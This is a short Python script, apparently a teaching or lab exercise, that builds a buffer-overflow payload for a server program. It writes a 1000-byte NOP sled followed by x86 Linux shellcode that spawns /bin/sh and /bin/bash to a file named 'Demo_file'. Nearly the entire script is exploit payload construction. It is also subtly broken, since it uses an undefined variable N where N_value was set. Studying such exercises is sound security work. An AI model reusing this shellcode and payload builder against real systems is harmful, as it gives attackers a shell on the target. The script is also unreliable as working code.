# Will be using the python code to simulate the commands explained in the readme file for a simple usage.
# This python file is to simulate the malicious code insertion by the attacker to a server program

#Importing all the required libraries
import sys

# This shellcode creates a local shell
shell_code= ("\x31\xc0\x31\xdb\xb0\xd5\xcd\x80""\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50""\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00").encode('latin-1')

# This is the attackers code
Attacker_code= (
    "\x31\xc0"
    "\x50"
    "\x68""bash"
    "\x68""////"
    "\x68""/bin"
    "\x89\xe2"
    "\x31\xc9"
    "\x51"
    "\x52"
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x31\xd2"
    "\x31\xc0"
    "\xb0\x0b"
    "\xcd\x80").encode('latin-1')

# Setting the size of array format
N_value = 1000
# Creating an array
x = bytearray(0x90 for i in range(N))

# Adding the code at the end
l = len(Attacker_code)
start = N_value - l
x[start:] = Attacker_code

# Write the content to new text file which can be send together
file = open("Demo_file", "wb")
file.write(x)
file.close()
